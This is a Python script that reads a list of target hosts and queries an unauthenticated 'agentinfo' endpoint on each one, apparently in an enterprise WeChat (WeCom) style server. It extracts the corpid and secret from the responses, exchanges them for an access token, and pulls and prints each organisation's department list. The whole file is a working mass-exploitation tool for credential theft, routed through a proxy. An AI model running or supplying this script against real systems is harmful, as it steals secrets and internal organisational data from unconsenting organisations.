import requests
import re


def read_host_addresses(file_path):
    addresses = []
    with open(file_path, 'r') as file:
        addresses = file.read().splitlines()
    return addresses


def extract_info(response_text):
    strcorpid_pattern = r'"strcorpid":"([^"]*)"'
    secret_pattern = r'"Secret":"([^"]*)"'

    strcorpid_match = re.search(strcorpid_pattern, response_text)
    secret_match = re.search(secret_pattern, response_text)

    if strcorpid_match and secret_match:
        strcorpid = strcorpid_match.group(1)
        secret = secret_match.group(1)
        return strcorpid, secret
    else:
        return None, None


def extract_access_token(response_text):
    access_token_pattern = r'"access_token":"([^"]*)"'
    access_token_match = re.search(access_token_pattern, response_text)
    if access_token_match:
        return access_token_match.group(1)
    else:
        return None


def main():
    host_file_path = 'host.txt'  # 替换为你的主机文件路径
    target_path = '/cgi-bin/gateway/agentinfo'
    proxy_host = '127.0.0.1'
    proxy_port = 7890

    host_addresses = read_host_addresses(host_file_path)
    vulnerable_urls = []  # 存储存在漏洞的 URL

    for address in host_addresses:
        url = f'http://{address}{target_path}'
        proxy_url = f'http://{proxy_host}:{proxy_port}'
        proxies = {'http': proxy_url, 'https': proxy_url}

        try:
            response = requests.get(url, proxies=proxies)
            if response.status_code == 200 and ('agentid' in response.text or 'corpid' in response.text):
                vulnerable_urls.append(url)  # 添加漏洞 URL 到列表
                strcorpid, secret = extract_info(response.text)
                if strcorpid and secret:
                    token_url = f'http://{address}/cgi-bin/gettoken?corpid={strcorpid}&corpsecret={secret}'
                    token_response = requests.get(token_url, proxies=proxies)
                    access_token = extract_access_token(token_response.text)
                    if access_token:
                        department_list_url = f'http://{address}/cgi-bin/department/list?access_token={access_token}'
                        department_response = requests.get(department_list_url, proxies=proxies)
                        print(f"Vulnerability detected at {address}:")
                        print(f"URL: {url}")
                        print(f"strcorpid: {strcorpid}")
                        print(f"Secret: {secret}")
                        print(f"Token URL: {token_url}")
                        print(f"Access Token: {access_token}")
                        print(f"Department List URL: {department_list_url}")
                        print(f"Department List Response: {department_response.text}")
                        print("=" * 30)
        except requests.exceptions.RequestException as e:
            pass

    if not vulnerable_urls:
        print("No vulnerabilities found.")


if __name__ == "__main__":
    main()
